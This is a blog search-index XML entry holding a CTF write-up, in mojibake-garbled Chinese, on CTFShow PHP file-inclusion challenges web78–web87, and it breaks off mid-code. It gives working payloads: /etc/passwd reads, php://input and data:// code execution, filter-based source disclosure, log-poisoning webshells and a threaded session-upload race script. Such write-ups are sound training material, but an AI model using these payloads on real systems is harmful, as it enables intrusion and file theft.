<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CTFShow æ–‡ä»¶åŒ…å«ç¬”è®°</title>
    <url>/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="CTFShow-æ–‡ä»¶åŒ…å«ç¬”è®°"><a href="#CTFShow-æ–‡ä»¶åŒ…å«ç¬”è®°" class="headerlink" title="CTFShow æ–‡ä»¶åŒ…å«ç¬”è®°"></a>CTFShow æ–‡ä»¶åŒ…å«ç¬”è®°</h1><h2 id="web78â€”â€”æ–‡ä»¶åŒ…å«â€”â€”phpä¼ªåè®®"><a href="#web78â€”â€”æ–‡ä»¶åŒ…å«â€”â€”phpä¼ªåè®®" class="headerlink" title="web78â€”â€”æ–‡ä»¶åŒ…å«â€”â€”phpä¼ªåè®®"></a>web78â€”â€”æ–‡ä»¶åŒ…å«â€”â€”phpä¼ªåè®®</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>æ–¹æ³•ä¸€ï¼š</strong></p>
<ol>
<li>å°è¯•æ˜¯å¦å¯ä»¥æŸ¥çœ‹ /etc/passwdä¸­çš„å†…å®¹: å‘ç°å¯ä»¥æŸ¥çœ‹</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web78.png"></p>
<ol start="2">
<li>å°è¯•ä½¿ç”¨ php://input åè®®:</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line">post:</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">&quot;tac flag.php&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web78_1.png"></p>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web78_2.png"></p>
<p><strong>æ–¹æ³•äºŒï¼š</strong></p>
<pre><code> 1. å°è¯•ä½¿ç”¨ php://filter/read=convert.base64-encode/resource=flag.php
</code></pre>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web78_3.png"></p>
<p>â€‹    base64è§£ç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:55:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:55:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;db4b1df7-****-4633-ac61-717d14afa306&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>â€‹    å¾—åˆ°äº† flag.</p>
<h2 id="web79â€”â€”æ–‡ä»¶åŒ…å«"><a href="#web79â€”â€”æ–‡ä»¶åŒ…å«" class="headerlink" title="web79â€”â€”æ–‡ä»¶åŒ…å«"></a>web79â€”â€”æ–‡ä»¶åŒ…å«</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:10:14</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:12:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå‘ç°é¢˜ç›® ä½¿ç”¨ str_replace å°†phpæ›¿æ¢ä¸ºäº† ???</p>
<p><strong>æ–¹æ³•ä¸€ï¼š</strong></p>
<pre><code> 1. ä½¿ç”¨ å¤§å†™ ç»•è¿‡:
</code></pre>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//input</span></span><br><span class="line">post:</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">&quot;tac flag.php&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web79.png"></p>
<p><strong>æ–¹æ³•äºŒï¼š</strong></p>
<pre><code> 1. ä½¿ç”¨ mv å‘½ä»¤ å°† flag.php é‡å‘½åä¸º a.txt
</code></pre>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//input</span></span><br><span class="line">post:</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;mv flag.php a.txt&quot;</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<pre><code> 2. æŸ¥çœ‹ a.txt 
</code></pre>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web79_2.png"></p>
<p><strong>æ–¹æ³•ä¸‰ï¼š</strong></p>
<ol>
<li>ä½¿ç”¨ data:// åè®®:</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æœªä½¿ç”¨ base64 ç¼–ç </span></span><br><span class="line">?file=data:<span class="comment">//text/plain,<span class="meta">&lt;?pHp</span> system(&quot;tac f*&quot;);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">// ä½¿ç”¨ base64 ç¼–ç  </span></span><br><span class="line"><span class="comment">// <span class="meta">&lt;?php</span> system(&#x27;tac flag.php&#x27;); = base64 = PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web79_1.png"></p>
<h2 id="web80â€”â€”æ–‡ä»¶åŒ…å«â€”â€”æ—¥å¿—shell"><a href="#web80â€”â€”æ–‡ä»¶åŒ…å«â€”â€”æ—¥å¿—shell" class="headerlink" title="web80â€”â€”æ–‡ä»¶åŒ…å«â€”â€”æ—¥å¿—shell"></a>web80â€”â€”æ–‡ä»¶åŒ…å«â€”â€”æ—¥å¿—shell</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:26:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº† php å’Œ data:</p>
<p><strong>æ–¹æ³•ä¸€ï¼š</strong></p>
<pre><code> 1. å°è¯•ä½¿ç”¨ php://inputï¼š
</code></pre>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//input</span></span><br><span class="line">postï¼š</span><br><span class="line">   	<span class="meta">&lt;?php</span> system(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">&#x27;tac fl0g.php&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web80.png"></p>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_1.png"></p>
<pre><code> 2. å°è¯•ä½¿ç”¨ data:// åè®®å¹¶ å¤§å†™ DATA:// ä½†ç»•è¿‡å¤±è´¥
</code></pre>
<p><strong>æ–¹æ³•äºŒï¼š</strong></p>
<pre><code> 1. åˆ©ç”¨ æ—¥å¿— shell ï¼š /var/log/nginx/access.log
 2. bp ä¸­ user-agent å†™å…¥ä¸€å¥è¯
</code></pre>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web80_2.png"></p>
<pre><code> 3. å°è¯•è¿æ¥:
</code></pre>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web80_3.png"></p>
<p>â€‹    4. æŸ¥æ‰¾ flagï¼ˆçœç•¥ï¼‰</p>
<h2 id="web81â€”â€”æ–‡ä»¶åŒ…å«â€”â€”æ—¥å¿—shell"><a href="#web81â€”â€”æ–‡ä»¶åŒ…å«â€”â€”æ—¥å¿—shell" class="headerlink" title="web81â€”â€”æ–‡ä»¶åŒ…å«â€”â€”æ—¥å¿—shell"></a>web81â€”â€”æ–‡ä»¶åŒ…å«â€”â€”æ—¥å¿—shell</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<ol>
<li>å¯ä»¥å‘ç°æ–‡ä¸­å°† php/data/: éƒ½æ›¿æ¢ä¸ºäº† ???;</li>
<li>å°è¯•æ˜¯å¦èƒ½æŸ¥çœ‹ æœåŠ¡å™¨æ—¥å¿—: ?file=/var/log/nginx/access.log â€” æˆåŠŸ</li>
</ol>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81.png"></p>
<p>   3.å°†ä¸€å¥è¯æœ¨é©¬ å†™å…¥åˆ° User Agentå½“ä¸­: HackBar/Burp:</p>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_1.png"></p>
<p>   4.å†æ¬¡æŸ¥çœ‹æ—¥å¿—ï¼Œæ—¥å¿—æ˜¯å¦åŒ…å«äº† ä¸€å¥è¯: â€” æœ‰</p>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_2.png"></p>
<p>   5.èšå‰‘/èœåˆ€è¿æ¥:</p>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_3.png"></p>
<p>   æŸ¥æ‰¾flag:</p>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_4.png"></p>
<h2 id="web82â€”â€”æ–‡ä»¶åŒ…å«"><a href="#web82â€”â€”æ–‡ä»¶åŒ…å«" class="headerlink" title="web82â€”â€”æ–‡ä»¶åŒ…å«"></a>web82â€”â€”æ–‡ä»¶åŒ…å«</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 19:34:45</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<p>æŠŠ php,data,:, . éƒ½æ›¿æ¢ä¸ºäº† ??? ; è¿™äº›åè®®éƒ½ç”¨ä¸äº†å¯ä»¥è€ƒè™‘å°è¯•ç”¨ sessionå¯¹è¯æ–‡ä»¶åŒ…å«</p>
<p>â€‹    1.ç¼–è¾‘ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;ç›®æ ‡URL&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2333&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>â€‹    2.å°† â€œç›®æ ‡URLâ€ è·Ÿæ”¹ä¸ºé¢˜ç›®åœ°å€: ä¸Šä¼ ä¸€ä¸ª txt æ–‡ä»¶ å†…å®¹å­—æ¯æ•°å­—éšä¾¿éƒ½å¯</p>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82.png"></p>
<pre><code> 3. Bp æŠ“åŒ…:
</code></pre>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_1.png"></p>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_2.png"></p>
<p>â€‹    å¦‚å›¾æ‰€ç¤º åœ¨å¤´éƒ¨ åŠ å…¥ Cookie:PHPSESSID=test ï¼Œå°† PHP_SESSION_UPLOAD_PROGRESS å†…å®¹ä¿®æ”¹ä¸º: <?php system('tac f*.php');?>  å†å°† Payloads type è®¾ç½®ä¸º Null payloads, å¼€å¯çˆ†ç ´</p>
<pre><code> 4. å†çˆ†ç ´ä¸€ä¸ª è¯·æ±‚åœ°å€ : ?file=/tmp/sess_test  ; sess_testå°±æ˜¯äº§ç”Ÿçš„ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ testå°±æ˜¯åˆšåˆšè®¾ç½®çš„ Cookie:PHPSESSID=testï¼Œç°åœ¨éœ€è¦è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œç”±äºæ­¤æ–‡ä»¶å¯èƒ½ä¼šç«‹é©¬åˆ é™¤ï¼Œå› æ­¤ä¹Ÿéœ€è¦ä¸€ä¸ª çˆ†ç ´è¯·æ±‚:
</code></pre>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_3.png"></p>
<pre><code>5. è§‚å¯Ÿç»“æœ: åœ¨è¯»å–ç›®æ ‡çš„è¯·æ±‚çˆ†ç ´ä¸­æŸ¥çœ‹ å“åº”ç»“æœï¼šå¦‚ä¸‹å›¾
</code></pre>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_4.png"></p>
<pre><code> 6. å½“ç„¶ä¹Ÿå¯ä»¥å†™ä¸€ä¸ª è„šæœ¬æ¥å®ç°çˆ†ç ´ï¼šå¥ˆä½•æˆ‘æ˜¯èœé¸¡ğŸ”ä¸€åªï¼Œå‚è€ƒäº†å¤§ä½¬çš„è„šæœ¬:
</code></pre>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://59af8191-fdc8-414f-bb1c-f2726b946851.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line">sessID = <span class="string">&#x27;test&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Write</span>(<span class="params">session</span>):</span></span><br><span class="line">	<span class="keyword">while</span> event.isSet():</span><br><span class="line">		file = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">		response = session.post(</span><br><span class="line">			url,</span><br><span class="line">			cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,</span><br><span class="line">			data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;cat *.php&quot;);?&gt;&#x27;</span>&#125;,</span><br><span class="line">			files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.txt&#x27;</span>, file)&#125;</span><br><span class="line">		)</span><br><span class="line">	<span class="comment"># print(response.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Read</span>(<span class="params">session</span>):</span></span><br><span class="line">	<span class="keyword">while</span> event.isSet():</span><br><span class="line">		response = session.get(url + <span class="string">&#x27;?file=/tmp/sess_&#x27;</span> +sessID)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;test&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">			<span class="built_in">print</span>(response.text)</span><br><span class="line">			event.clear()</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;+&#x27;</span>*<span class="number">10</span> + <span class="string">&#x27;ReTrying&#x27;</span> + <span class="string">&#x27;+&#x27;</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	event = threading.Event()</span><br><span class="line">	event.<span class="built_in">set</span>()</span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">			threading.Thread(target=Write, args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">			threading.Thread(target=Read, args=(session,)).start()</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_5.png"></p>
<h2 id="web83â€”â€”æ–‡ä»¶åŒ…å«"><a href="#web83â€”â€”æ–‡ä»¶åŒ…å«" class="headerlink" title="web83â€”â€”æ–‡ä»¶åŒ…å«"></a>web83â€”â€”æ–‡ä»¶åŒ…å«</h2><p><strong>åŒä¸Š</strong></p>
<h2 id="web84â€”â€”æ–‡ä»¶åŒ…å«"><a href="#web84â€”â€”æ–‡ä»¶åŒ…å«" class="headerlink" title="web84â€”â€”æ–‡ä»¶åŒ…å«"></a>web84â€”â€”æ–‡ä»¶åŒ…å«</h2><p><strong>åŒä¸Š</strong></p>
<h2 id="web85â€”â€”æ–‡ä»¶åŒ…å«"><a href="#web85â€”â€”æ–‡ä»¶åŒ…å«" class="headerlink" title="web85â€”â€”æ–‡ä»¶åŒ…å«"></a>web85â€”â€”æ–‡ä»¶åŒ…å«</h2><p><strong>åŒä¸Šï¼Œç±»ä¼¼</strong></p>
<h2 id="web86â€”â€”æ–‡ä»¶åŒ…å«"><a href="#web86â€”â€”æ–‡ä»¶åŒ…å«" class="headerlink" title="web86â€”â€”æ–‡ä»¶åŒ…å«"></a>web86â€”â€”æ–‡ä»¶åŒ…å«</h2><p><strong>åŒä¸Šï¼Œç±»ä¼¼</strong></p>
<h2 id="web87â€”â€”æ–‡ä»¶åŒ…å«"><a href="#web87â€”â€”æ–‡ä»¶åŒ…å«" class="headerlink" title="web87â€”â€”æ–‡ä»¶åŒ…å«"></a>web87â€”â€”æ–‡ä»¶åŒ…å«</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:57:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span 